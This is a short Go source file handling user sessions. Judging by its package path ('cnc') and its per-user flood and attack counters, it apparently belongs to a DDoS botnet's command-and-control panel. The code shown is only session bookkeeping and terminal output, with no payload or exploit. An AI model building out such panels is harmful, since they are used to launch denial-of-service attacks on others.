package sessions

import (
	"cnc/core/database"
	"cnc/core/utils"
	"fmt"
	"net"
	"sync"
)

var (
	Sessions     = make(map[int64]*Session)
	SessionMutex sync.Mutex
)

type Session struct {
	ID       int64
	Username string
	Conn     net.Conn
	Account  database.AccountInfo
	Floods   int

	Chat bool
}

func (s *Session) Remove() {
	utils.Infof("Session closed")
	SessionMutex.Lock()
	delete(Sessions, s.ID)
	SessionMutex.Unlock()
}

func (s *Session) FetchAttacks(username string) {
	totalAttacks, err := database.DatabaseConnection.GetTotalAttacks(username)
	if err != nil {
		utils.Errorf("[Session - FetchAttacks] %s", err)
		return
	}

	s.Floods = totalAttacks
}

func (s *Session) Print(data ...interface{}) {
	_, _ = s.Conn.Write([]byte(fmt.Sprint(data...)))
}

func (s *Session) Printf(format string, val ...any) {
	s.Print(fmt.Sprintf(format, val...))
}

func (s *Session) Println(data ...interface{}) {
	s.Print(fmt.Sprint(data...) + "\r\n")
}

func (s *Session) Clear() {
	s.Printf("\x1bc")
}
